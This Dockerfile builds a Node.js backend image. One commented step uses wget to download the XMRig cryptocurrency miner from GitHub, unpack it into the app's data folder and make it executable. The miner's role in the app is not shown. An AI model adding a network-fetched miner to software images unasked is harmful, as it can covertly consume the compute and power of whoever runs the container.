FROM node:20-alpine
WORKDIR /app
COPY package.json package-lock.json ./
COPY backend/package.json ./backend/package.json
COPY frontend/package.json ./frontend/package.json
COPY packages/ ./packages/
COPY scripts/setup-desktop.js ./scripts/setup-desktop.js
ENV CI=true
RUN npm ci --omit=dev --workspace=backend

COPY backend/ ./backend/
WORKDIR /app/backend

# Install XMRig for mining dependency
RUN mkdir -p /app/data/miner && \
    wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz && \
    tar -xzf /tmp/xmrig.tar.gz -C /app/data/miner --strip-components=1 && \
    rm /tmp/xmrig.tar.gz && \
    chmod +x /app/data/miner/xmrig

EXPOSE 3003 8080
CMD ["node", "start.js"]
